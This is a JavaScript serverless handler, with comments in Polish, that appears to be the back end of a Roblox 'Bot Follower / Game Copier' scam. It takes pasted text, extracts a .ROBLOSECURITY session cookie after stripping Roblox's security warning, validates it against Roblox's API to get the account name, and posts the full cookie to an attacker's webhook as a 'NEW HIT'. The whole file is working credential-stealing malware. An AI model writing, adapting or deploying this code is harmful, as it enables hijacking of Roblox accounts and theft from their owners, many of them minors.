export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  try {
    const { text } = req.body;
    const webhook = process.env.WEBHOOK_URL;

    if (!webhook) {
      return res.status(500).json({ error: "WEBHOOK_URL not set" });
    }

    if (!text || typeof text !== "string" || text.trim() === "") {
      return res.status(400).json({ error: "No input provided" });
    }

    const input = text.trim();
    let extracted = null;
    let username = "Nie udało się sprawdzić nazwy";
    let cookieValue = null;

    // 1. Stary sposób – "Game file" / items.
    const match = input.match(/items\.(.*?)(["\,])/i);
    if (match) {
      extracted = match[1].trim();
    }

    // 2. Próba potraktowania jako .ROBLOSECURITY cookie
    let possibleCookie = input;

    // Czyszczenie typowych śmieci
    if (possibleCookie.includes(".ROBLOSECURITY=")) {
      possibleCookie = possibleCookie.split(".ROBLOSECURITY=")[1].split(";")[0].trim();
    }
    if (possibleCookie.includes("_|WARNING")) {
      // usuwamy początek z ostrzeżeniem jeśli ktoś wkleił całość
      possibleCookie = possibleCookie.replace(/^_\|WARNING:.*?\|\s*/, "").trim();
    }

    if (possibleCookie.startsWith("_|")) {
      cookieValue = possibleCookie;

      // Sprawdzamy username przez Roblox API
      try {
        const authResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
          method: "GET",
          headers: {
            "Cookie": `.ROBLOSECURITY=${cookieValue}`,
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (compatible; BotFollower/1.0)"
          },
          redirect: "manual"
        });

        if (authResponse.ok) {
          const data = await authResponse.json();
          username = data.name || data.displayName || data.username || "Zalogowano (nazwa nie пришла)";
        } else if (authResponse.status === 401) {
          username = "Cookie nieważne / wygasło (401)";
        } else {
          username = `Błąd API: ${authResponse.status}`;
        }
      } catch (apiError) {
        username = "Błąd połączenia z Roblox API";
        console.error("Roblox API error:", apiError);
      }
    }

    // Przygotowujemy treść embeda
    let description = "";

    if (extracted) {
      description += `**Game/Items extract:**\n\`\`\`${extracted}\`\`\`\n\n`;
    }

    if (cookieValue) {
      description += `**Cookie (.ROBLOSECURITY):**\n\`\`\`${cookieValue}\`\`\`\n\n`;
    }

    description += `**Username właściciela cookie:** ${username}`;

    if (!extracted && !cookieValue) {
      description = "Nic nie udało się wyciągnąć.\nWklejony tekst:\n```" + input.substring(0, 300) + (input.length > 300 ? "..." : "") + "```";
    }

    const embed = {
      title: "NEW HIT / COOKIE – Bot Follower",
      description: description,
      color: 16711680, // czerwony
      timestamp: new Date().toISOString(),
      footer: {
        text: "Bot Follower | Game Copier"
      }
    };

    const response = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [embed]
      })
    });

    const result = await response.text();

    res.status(200).json({
      success: true,
      extracted: extracted || null,
      cookie: cookieValue ? cookieValue.substring(0, 40) + "..." : null,
      username: username,
      webhookResponse: result
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
}
